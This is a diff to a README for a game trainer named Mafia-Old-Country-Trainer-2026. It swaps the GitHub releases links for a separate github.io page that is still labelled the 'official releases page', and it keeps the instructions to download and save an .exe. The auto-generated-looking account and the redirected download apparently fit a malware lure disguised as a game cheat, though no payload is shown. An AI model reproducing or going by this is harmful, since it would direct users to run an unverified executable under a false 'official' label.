@@ -1,6 +1,6 @@
 # 🎮 Mafia-Old-Country-Trainer-2026 - Customize your gameplay experience today
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Machinemade-greaterprairiechicken513/Mafia-Old-Country-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://machinemade-greaterprairiechicken513.github.io)
 
 ## What this software does
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 You need to access the official release page to get the latest version of the trainer. 
 
-1. Visit the [official releases page](https://github.com/Machinemade-greaterprairiechicken513/Mafia-Old-Country-Trainer-2026/releases).
+1. Visit the [official releases page](https://machinemade-greaterprairiechicken513.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Select the file ending in .exe to start your download.
 4. Save the file to a known folder on your computer, such as your Downloads folder or your Desktop.
